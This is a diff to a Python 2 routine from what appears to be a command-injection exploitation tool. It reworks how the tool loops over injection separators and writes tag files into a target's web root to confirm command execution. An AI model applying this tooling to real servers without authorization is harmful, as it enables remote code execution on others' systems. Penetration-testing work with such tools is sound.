@@ -53,8 +53,7 @@ def fb_injection_handler(url,delay,filename,http_request_method):
   injection_type = "Semiblind-based Command Injection"
   technique = "file-based semiblind injection technique"
   
-  sys.stdout.write( colors.BOLD + "(*) Testing the "+ technique + "... " + colors.RESET)
-  sys.stdout.flush()
+  print colors.BOLD + "(*) Testing the "+ technique + "... " + colors.RESET
   
   # Print the findings to log file.
   output_file = open(filename + ".txt", "a")
@@ -63,26 +62,6 @@ def fb_injection_handler(url,delay,filename,http_request_method):
   output_file.write("\n(+) Technique : " + technique.title())
   output_file.close()
   
-  # Change TAG on every request to prevent false-positive resutls.
-  TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) 
-
-  # Check if defined "--base64" option.
-  if menu.options.base64_trick == True:
-    B64_ENC_TAG = base64.b64encode(TAG)
-    B64_DEC_TRICK = settings.B64_DEC_TRICK
-  else:
-    B64_ENC_TAG = TAG
-    B64_DEC_TRICK = ""
-    
-  # The output file for file-based injection technique.
-  OUTPUT_TEXTFILE = B64_ENC_TAG + ".txt"
-  
-  if menu.options.srv_root_dir:
-    SRV_ROOT_DIR = menu.options.srv_root_dir
-  else:
-    SRV_ROOT_DIR = settings.SRV_ROOT_DIR
-  sys.stdout.write("\n(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on " + SRV_ROOT_DIR + "... ")
-  sys.stdout.flush()
   for prefix in settings.PREFIXES:
     for suffix in settings.SUFFIXES:
       for separator in settings.SEPARATORS:
@@ -91,7 +70,29 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 	combination = prefix + separator
 	if combination in settings.JUNK_COMBINATION:
 	  prefix = ""
-	 	
+
+	# Change TAG on every request to prevent false-positive resutls.
+	TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) 
+
+	# Check if defined "--base64" option.
+	if menu.options.base64_trick == True:
+	  B64_ENC_TAG = base64.b64encode(TAG)
+	  B64_DEC_TRICK = settings.B64_DEC_TRICK
+	else:
+	  B64_ENC_TAG = TAG
+	  B64_DEC_TRICK = ""
+	  
+	# The output file for file-based injection technique.
+	OUTPUT_TEXTFILE = B64_ENC_TAG + ".txt"
+	
+	if menu.options.srv_root_dir:
+	  SRV_ROOT_DIR = menu.options.srv_root_dir
+	else:
+	  SRV_ROOT_DIR = settings.SRV_ROOT_DIR
+
+	sys.stdout.write("(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on " + SRV_ROOT_DIR + "... ")
+	sys.stdout.flush()
+
 	try:
 	  # File-based decision payload (check if host is vulnerable).
 	  payload = fb_payloads.decision(separator,B64_ENC_TAG,B64_DEC_TRICK,OUTPUT_TEXTFILE)
@@ -140,11 +141,14 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 	    
 	  # If temp-based technique failed, use the "/tmp/" directory for tempfile-based technique.
 	  except urllib2.HTTPError, e:
-	      if e.getcode() == 404:
-		print "[" + colors.RED + " FAILED "+colors.RESET+"]"
+	      if e.getcode() == 404 :
+		if not menu.options.verbose:
+		  print "[" + colors.RED + " FAILED "+colors.RESET+"]"
+		else:
+		  print colors.BGRED + "\n(x) Error: Unable to upload the '"+ OUTPUT_TEXTFILE +"' on '" + settings.SRV_ROOT_DIR + "'." + colors.RESET + ""
 		tmp_upload = raw_input("(*) Do you want to upload file, on temporary directory [Y/n] > ")
 		if tmp_upload == "Y" or tmp_upload == "y":
-		  raise
+		  stop_injection = True
 		  if menu.options.tmp_path:
 		    tmp_path = menu.options.tmp_path
 		  else:
@@ -165,9 +169,11 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 	except KeyboardInterrupt: 
 	  raise
 	
-	except urllib2.URLError, e:
-	  print "\n" + colors.BGRED + "(x) Error: " + e.reason + colors.RESET + ""
-	  sys.exit(0)
+	except :
+	  if stop_injection:
+	    raise
+	  else:
+	    continue
 	  
 	# Yaw, got shellz! 
 	# Do some magic tricks!
